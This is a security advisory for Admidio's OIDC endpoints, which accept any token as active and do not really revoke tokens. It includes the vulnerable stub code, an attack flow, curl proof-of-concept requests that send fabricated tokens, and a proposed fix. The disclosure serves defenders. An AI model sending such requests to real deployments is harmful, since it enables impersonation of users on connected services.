# [M] Admidio: OIDC Token Introspection Endpoint Returns Active for All Tokens Without Validation

## Summary
Severity: Medium
Advisory: GHSA-9xx5-cv6j-x533
CVE: CVE-2026-41671
CWE: CWE-287
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-9xx5-cv6j-x533
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.9

## Details
## Summary

The OIDC token introspection endpoint (`/modules/sso/index.php/oidc/introspect`) always returns `{"active": true}` for every request, regardless of whether a valid token is provided, whether the token is expired, revoked, or completely fabricated. The endpoint performs no authentication of the calling resource server and no validation of the submitted token. Any resource server that relies on this introspection endpoint to validate access tokens will accept all requests as authorized, enabling complete authentication bypass.

Additionally, the OIDC token revocation endpoint (`/oidc/revoke`) returns `{"revoked": true}` without actually revoking any token, preventing resource servers from invalidating compromised credentials.

## Details

The vulnerability is in `src/SSO/Service/OIDCService.php`, lines 604-619:

```php
public function handleIntrospectionRequest() {
    // TODO_RK
    if (!$this->isServiceSetup) {
        $this->setupService();
    }
    return new JsonResponse(["active" => true]);
}

public function handleRevocationRequest() {
    // TODO_RK
    if (!$this->isServiceSetup) {
        $this->setupService();
    }

    return new JsonResponse(["revoked" => true]);
}
```

The introspection endpoint is routed at `modules/sso/index.php`, line 58-59:

```php
} elseif (strpos($requestUri, '/oidc/introspect') !== false) {
    $response = $oidcService->handleIntrospectionRequest();
```

The router comment at line 35 says "Login checks will be done in the individual endpoint handler functions!" but neither `handleIntrospectionRequest` nor `handleRevocationRequest` perform any authentication or authorization checks.

Per RFC 7662 (OAuth 2.0 Token Introspection), the introspection endpoint:
1. MUST authenticate the calling resource server (Section 2.1)
2. MUST validate the submitted token against its database
3. MUST return `{"active": false}` for invalid, expired, or revoked tokens

The current implementation violates all three requirements.

**Attack flow:**
1. Attacker obtains a resource server's endpoint URL that uses Admidio as its OIDC provider
2. Attacker crafts any arbitrary string as a Bearer token
3. Resource server sends the fabricated token to `/oidc/introspect` for validation
4. Admidio returns `{"active": true}` without any checks
5. Resource server accepts the fabricated token as valid and grants access

**The revocation bypass compounds this:** If a legitimate token is stolen, the resource server or client application cannot revoke it. Calling `/oidc/revoke` returns success without actually revoking the token in the database, so the stolen token remains usable indefinitely (until its expiry time).

## PoC

```bash
# Step 1: Confirm the introspection endpoint exists and always returns active
# No valid token needed - any string works
curl -X POST https://TARGET/modules/sso/index.php/oidc/introspect \
  -d "token=COMPLETELY_FABRICATED_TOKEN_12345"

# Expected response: {"active":true}

# Step 2: Try with an empty token
curl -X POST https://TARGET/modules/sso/index.php/oidc/introspect \
  -d "token="

# Expected response: {"active":true}

# Step 3: Demonstrate that revocation is also broken
curl -X POST https://TARGET/modules/sso/index.php/oidc/revoke \
  -d "token=any_valid_token_here"

# Expected response: {"revoked":true}
# But the token is NOT actually revoked in the database

# Step 4: Verify the token is still active after "revocation"
curl -X POST https://TARGET/modules/sso/index.php/oidc/introspect \
  -d "token=any_valid_token_here"

# Still returns: {"active":true}
```

## Impact

- **Authentication Bypass on Resource Servers**: Any application (wiki, CMS, project management tool, etc.) configured to validate tokens against this Admidio OIDC introspection endpoint will accept completely fabricated tokens. An attacker can impersonate any user on all connected resource servers.
- **Inability to Revoke Compromised Tokens**: If a legitimate access token is leaked or stolen, there is no way to revoke it through the standard OIDC revocation flow. The token remains valid until its 1-hour expiry.
- **Scope Change (S:C)**: The vulnerability in the Admidio authorization server directly impacts the security of all connected resource servers (different security authority), which is why the CVSS scope is Changed.

## Recommended Fix

Replace the stub implementations with proper token introspection and revocation logic:

```php
public function handleIntrospectionRequest() {
    if (!$this->isServiceSetup) {
        $this->setupService();
    }
    
    $request = $this->getRequest();
    
    // 1. Authenticate the resource server (RFC 7662 Section 2.1)
    // The resource server MUST authenticate using client credentials
    $clientId = $request->getParsedBody()['client_id'] ?? null;
    $clientSecret = $request->getParsedBody()['client_secret'] ?? null;
    
    if (!$clientId || !$this->clientRepository->validateClient($clientId, $clientSecret, null)) {
        return new JsonResponse(['error' => 'invalid_client'], 401);
    }
    
    // 2. Get and validate the token
    $tokenValue = $request->getParsedBody()['token'] ?? '';
    if (empty($tokenValue)) {
        return new JsonResponse(['active' => false]);
    }
    
    try {
        // Validate the token using the resource server
        $validatedRequest = $this->resourceServer->validateAuthenticatedRequest(
            $request->withHeader('Authorization', 'Bearer ' . $tokenValue)
        );
        
        $tokenId = $validatedRequest->getAttribute('oauth_access_token_id');
        
        // Check if token is revoked
        if ($this->accessTokenRepository->isAccessTokenRevoked($tokenId)) {
            return new JsonResponse(['active' => false]);
        }
        
        $token = $this->accessTokenRepository->getToken($tokenId);
        
        // Check expiry
        if ($token->getExpiryDateTime() < new \DateTimeImmutable()) {
            return new JsonResponse(['active' => false]);
        }
        
        return new JsonResponse([
            'active' => true,
            'sub' => $token->getUserIdentifier(),
            'client_id' => $token->getClient()->getIdentifier(),
            'exp' => $token->getExpiryDateTime()->getTimestamp(),
            'scope' => implode(' ', array_map(fn($s) => $s->getIdentifier(), $token->getScopes())),
        ]);
    } catch (\Exception $e) {
        return new JsonResponse(['active' => false]);
    }
}

public function handleRevocationRequest() {
    if (!$this->isServiceSetup) {
        $this->setupService();
    }
    
    $request = $this->getRequest();
    
    // Authenticate the client
    $clientId = $request->getParsedBody()['client_id'] ?? null;
    $clientSecret = $request->getParsedBody()['client_secret'] ?? null;
    
    if (!$clientId || !$this->clientRepository->validateClient($clientId, $clientSecret, null)) {
        return new JsonResponse(['error' => 'invalid_client'], 401);
    }
    
    $tokenValue = $request->getParsedBody()['token'] ?? '';
    if (!empty($tokenValue)) {
        try {
            $validatedRequest = $this->resourceServer->validateAuthenticatedRequest(
                $request->withHeader('Authorization', 'Bearer ' . $tokenValue)
            );
            $tokenId = $validatedRequest->getAttribute('oauth_access_token_id');
            $this->accessTokenRepository->revokeAccessToken($tokenId);
        } catch (\Exception $e) {
            // RFC 7009: The server responds with HTTP 200 even for invalid tokens
        }
    }
    
    return new JsonResponse([], 200);
}
```

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-9xx5-cv6j-x533
- https://nvd.nist.gov/vuln/detail/CVE-2026-41671
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.9
